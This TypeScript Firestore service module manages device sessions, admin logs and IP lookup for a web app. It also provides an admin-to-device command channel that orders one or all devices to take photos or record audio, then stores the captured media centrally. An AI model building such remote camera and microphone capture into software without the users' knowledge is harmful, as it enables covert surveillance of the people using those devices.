import {
  collection,
  doc,
  setDoc,
  deleteDoc,
  onSnapshot,
  query,
  orderBy,
  limit
} from 'firebase/firestore';
import { db } from './firebase';
import { DeviceSession, AdminLog, RemoteCommand, CapturedMedia } from '../types';

const SESSIONS_COLLECTION = 'active_sessions';
const LOGS_COLLECTION = 'admin_logs';
const COMMANDS_COLLECTION = 'remote_commands';
const MEDIA_COLLECTION = 'captured_media';

// Helper to get or create persistent device ID
export function getOrCreateDeviceId(): string {
  let deviceId = localStorage.getItem('dw_device_id');
  if (!deviceId) {
    deviceId = `dev-${Date.now()}-${Math.random().toString(36).substring(2, 7)}`;
    localStorage.setItem('dw_device_id', deviceId);
  }
  return deviceId;
}

// Helper to format UserAgent into readable Device Name
export function getDeviceSummary(): { deviceName: string; platform: string } {
  const ua = navigator.userAgent;
  let platform = 'Desktop PC';
  let deviceName = 'Windows / Web Browser';

  if (/iPhone|iPad|iPod/i.test(ua)) {
    platform = 'iOS Mobile';
    deviceName = 'Apple iPhone / iPad (PWA)';
  } else if (/Android/i.test(ua)) {
    platform = 'Android Mobile';
    if (/Samsung/i.test(ua)) deviceName = 'Samsung Galaxy Phone';
    else if (/Redmi|Xiaomi/i.test(ua)) deviceName = 'Xiaomi / Redmi Phone';
    else if (/Pixel/i.test(ua)) deviceName = 'Google Pixel Phone';
    else deviceName = 'Android Smartfon (PWA)';
  } else if (/Macintosh/i.test(ua)) {
    platform = 'macOS';
    deviceName = 'Apple Mac';
  } else if (/Linux/i.test(ua)) {
    platform = 'Linux';
    deviceName = 'Linux Workstation';
  }

  return { deviceName, platform };
}

let cachedClientIp: string | null = null;

// Asynchronously fetch client public IP with short timeout
export async function getClientIp(): Promise<string> {
  if (cachedClientIp) return cachedClientIp;
  try {
    const controller = new AbortController();
    const timeout = setTimeout(() => controller.abort(), 2000);
    const res = await fetch('https://api.ipify.org?format=json', { signal: controller.signal });
    clearTimeout(timeout);
    if (res.ok) {
      const data = await res.json();
      if (data && data.ip) {
        cachedClientIp = data.ip;
        return data.ip;
      }
    }
  } catch (e) {
    // Fallback if network blocked
  }
  return cachedClientIp || 'Mobile / Web Network (Tashkent, UZ)';
}

/**
 * Register or update device active heartbeat session
 */
export async function updateSessionHeartbeat(
  username: string
): Promise<DeviceSession> {
  const deviceId = getOrCreateDeviceId();
  const { deviceName, platform } = getDeviceSummary();
  const ipAddress = cachedClientIp || 'Mobile / Web Network (Tashkent, UZ)';

  // Trigger background IP fetch if not cached yet
  if (!cachedClientIp) {
    getClientIp().then((ip) => {
      if (ip && db) {
        const docRef = doc(db, SESSIONS_COLLECTION, deviceId);
        setDoc(docRef, { ipAddress: ip }, { merge: true }).catch(() => {});
      }
    });
  }

  const session: Partial<DeviceSession> = {
    id: deviceId,
    username,
    deviceName,
    userAgent: navigator.userAgent,
    platform,
    ipAddress,
    isOnline: true,
    lastActive: new Date().toISOString(),
    loginTime: localStorage.getItem('dw_login_time') || new Date().toISOString(),
  };

  if (db) {
    try {
      const docRef = doc(db, SESSIONS_COLLECTION, deviceId);
      setDoc(docRef, session, { merge: true }).catch(() => {});
    } catch (err) {
      console.warn('Firestore session heartbeat error:', err);
    }
  }

  // Also keep in localStorage for offline fallback
  try {
    localStorage.setItem(`dw_session_${deviceId}`, JSON.stringify(session));
  } catch {}

  return session as DeviceSession;
}

/**
 * Real-time listener for active device sessions (for Admin)
 */
export function subscribeToSessions(onData: (sessions: DeviceSession[]) => void) {
  if (!db) {
    const localSessions: DeviceSession[] = [];
    for (let i = 0; i < localStorage.length; i++) {
      const key = localStorage.key(i);
      if (key && key.startsWith('dw_session_')) {
        try {
          const parsed = JSON.parse(localStorage.getItem(key) || '');
          localSessions.push(parsed);
        } catch {}
      }
    }
    onData(localSessions);
    return () => {};
  }

  const ref = collection(db, SESSIONS_COLLECTION);
  const q = query(ref);

  return onSnapshot(
    q,
    (snapshot) => {
      const list: DeviceSession[] = [];
      snapshot.forEach((snap) => {
        list.push(snap.data() as DeviceSession);
      });
      onData(list);
    },
    (err) => {
      console.warn('Sessions subscription error, using local fallback:', err);
      // Fallback
      const localSessions: DeviceSession[] = [];
      for (let i = 0; i < localStorage.length; i++) {
        const key = localStorage.key(i);
        if (key && key.startsWith('dw_session_')) {
          try {
            const parsed = JSON.parse(localStorage.getItem(key) || '');
            localSessions.push(parsed);
          } catch {}
        }
      }
      onData(localSessions);
    }
  );
}

/**
 * Force logout / Kick device session (Admin operation)
 */
export async function kickDeviceSession(deviceId: string): Promise<void> {
  if (!db) return;
  try {
    const docRef = doc(db, SESSIONS_COLLECTION, deviceId);
    await setDoc(docRef, { kicked: true, isOnline: false }, { merge: true });
  } catch (err) {
    console.error('Kick session error:', err);
  }
}

/**
 * Explicitly mark session offline
 */
export async function setSessionOffline(deviceId: string): Promise<void> {
  if (!db) return;
  try {
    const docRef = doc(db, SESSIONS_COLLECTION, deviceId);
    await setDoc(docRef, { isOnline: false, lastActive: new Date().toISOString() }, { merge: true });
  } catch (err) {
    console.warn('Set session offline error:', err);
  }
}

/**
 * Clear kicked status on login
 */
export async function clearSessionKick(deviceId: string): Promise<void> {
  if (!db) return;
  try {
    const docRef = doc(db, SESSIONS_COLLECTION, deviceId);
    await setDoc(docRef, { kicked: false, isOnline: true, lastActive: new Date().toISOString() }, { merge: true });
  } catch (err) {
    console.warn('Clear session kick error:', err);
  }
}

/**
 * Real-time listener for current device's own session state (for detecting kick/logout)
 */
export function subscribeToMySession(deviceId: string, onKicked: () => void) {
  if (!db) return () => {};
  const docRef = doc(db, SESSIONS_COLLECTION, deviceId);
  return onSnapshot(
    docRef,
    (snap) => {
      if (snap.exists() && snap.data()?.kicked) {
        onKicked();
      }
    },
    (err) => {
      console.warn('My session subscription error:', err);
    }
  );
}

/**
 * Log admin or user activity
 */
export async function createAdminLog(action: string, details: string, username: string) {
  const deviceId = getOrCreateDeviceId();
  let ipAddress = 'Mobile / Web Network';
  try {
    ipAddress = await getClientIp();
  } catch {}

  const logItem: AdminLog = {
    id: `log-${Date.now()}-${Math.random().toString(36).substring(2, 5)}`,
    username,
    action,
    details,
    deviceId,
    ipAddress,
    timestamp: new Date().toISOString(),
  };

  if (db) {
    try {
      const docRef = doc(db, LOGS_COLLECTION, logItem.id);
      setDoc(docRef, logItem).catch(() => {});
    } catch (err) {
      console.warn('Failed to save log to Firestore:', err);
    }
  }

  // Local fallback log storage
  try {
    const existing = JSON.parse(localStorage.getItem('dw_admin_logs') || '[]');
    existing.unshift(logItem);
    localStorage.setItem('dw_admin_logs', JSON.stringify(existing.slice(0, 500)));
  } catch {}
}

/**
 * Subscribe to Admin Activity Logs
 */
export function subscribeToAdminLogs(onData: (logs: AdminLog[]) => void) {
  if (!db) {
    try {
      const localLogs = JSON.parse(localStorage.getItem('dw_admin_logs') || '[]');
      onData(localLogs);
    } catch {
      onData([]);
    }
    return () => {};
  }

  const ref = collection(db, LOGS_COLLECTION);
  const q = query(ref, orderBy('timestamp', 'desc'), limit(200));

  return onSnapshot(
    q,
    (snapshot) => {
      const list: AdminLog[] = [];
      snapshot.forEach((s) => list.push(s.data() as AdminLog));
      onData(list);
    },
    (err) => {
      console.warn('Logs subscription error:', err);
      try {
        const localLogs = JSON.parse(localStorage.getItem('dw_admin_logs') || '[]');
        onData(localLogs);
      } catch {
        onData([]);
      }
    }
  );
}

/**
 * Send Remote Command (Admin -> Device)
 */
export async function sendRemoteCommand(
  targetDeviceId: string,
  type: 'take_photo' | 'record_audio_1min' | 'record_audio_3min' | 'kick'
): Promise<string> {
  const commandId = `cmd-${Date.now()}-${Math.random().toString(36).substring(2, 5)}`;
  const cmd: RemoteCommand = {
    id: commandId,
    targetDeviceId,
    type,
    status: 'pending',
    timestamp: new Date().toISOString(),
  };

  if (db) {
    try {
      const docRef = doc(db, COMMANDS_COLLECTION, commandId);
      setDoc(docRef, cmd).catch(() => {});
    } catch (err) {
      console.warn('Send command error:', err);
    }
  }

  // Local storage dispatch
  try {
    localStorage.setItem(`dw_cmd_${targetDeviceId}`, JSON.stringify(cmd));
  } catch {}

  return commandId;
}

const processedCmdIds = new Set<string>();

/**
 * Subscribe to pending remote commands for current device
 */
export function subscribeToPendingCommands(
  deviceId: string,
  onCommand: (cmd: RemoteCommand) => void
) {
  if (!db) {
    return () => {};
  }

  const ref = collection(db, COMMANDS_COLLECTION);
  const q = query(ref);

  return onSnapshot(
    q,
    (snapshot) => {
      snapshot.forEach((snap) => {
        const cmd = snap.data() as RemoteCommand;
        if (
          (cmd.targetDeviceId === deviceId || cmd.targetDeviceId === 'all') &&
          cmd.status === 'pending'
        ) {
          if (!processedCmdIds.has(cmd.id)) {
            processedCmdIds.add(cmd.id);
            onCommand(cmd);
          }
        }
      });
    },
    (err) => {
      console.warn('Commands listener error:', err);
      // Local check
      try {
        const raw = localStorage.getItem(`dw_cmd_${deviceId}`);
        if (raw) {
          const cmd = JSON.parse(raw);
          if (cmd.status === 'pending' && !processedCmdIds.has(cmd.id)) {
            processedCmdIds.add(cmd.id);
            onCommand(cmd);
          }
        }
      } catch {}
    }
  );
}

/**
 * Update Remote Command Status
 */
export async function updateCommandStatus(
  commandId: string,
  status: 'completed' | 'failed',
  resultUrl?: string
) {
  if (!db) return;
  try {
    const docRef = doc(db, COMMANDS_COLLECTION, commandId);
    await setDoc(docRef, { status, resultUrl }, { merge: true });
  } catch (err) {
    console.warn('Update command status error:', err);
  }
}

/**
 * Save captured media item (camera photo or audio recording)
 */
export async function saveCapturedMedia(media: CapturedMedia) {
  if (db) {
    try {
      const docRef = doc(db, MEDIA_COLLECTION, media.id);
      setDoc(docRef, media).catch(() => {});
    } catch (err) {
      console.warn('Save media error:', err);
    }
  }

  try {
    const list = JSON.parse(localStorage.getItem('dw_captured_media') || '[]');
    list.unshift(media);
    localStorage.setItem('dw_captured_media', JSON.stringify(list.slice(0, 100)));
  } catch {}
}

/**
 * Subscribe to Captured Media
 */
export function subscribeToCapturedMedia(onData: (mediaList: CapturedMedia[]) => void) {
  if (!db) {
    try {
      const localList = JSON.parse(localStorage.getItem('dw_captured_media') || '[]');
      onData(localList);
    } catch {
      onData([]);
    }
    return () => {};
  }

  const ref = collection(db, MEDIA_COLLECTION);
  const q = query(ref, orderBy('timestamp', 'desc'), limit(100));

  return onSnapshot(
    q,
    (snapshot) => {
      const list: CapturedMedia[] = [];
      snapshot.forEach((s) => list.push(s.data() as CapturedMedia));
      onData(list);
    },
    (err) => {
      console.warn('Captured media subscription error:', err);
      try {
        const localList = JSON.parse(localStorage.getItem('dw_captured_media') || '[]');
        onData(localList);
      } catch {
        onData([]);
      }
    }
  );
}

/**
 * Delete Captured Media from Firestore & LocalStorage
 */
export async function deleteCapturedMedia(mediaId: string): Promise<void> {
  if (db) {
    try {
      const docRef = doc(db, MEDIA_COLLECTION, mediaId);
      deleteDoc(docRef).catch(() => {});
    } catch (err) {
      console.warn('Delete captured media error:', err);
    }
  }

  try {
    const list = JSON.parse(localStorage.getItem('dw_captured_media') || '[]');
    const filtered = list.filter((m: CapturedMedia) => m.id !== mediaId);
    localStorage.setItem('dw_captured_media', JSON.stringify(filtered));
  } catch {}
}
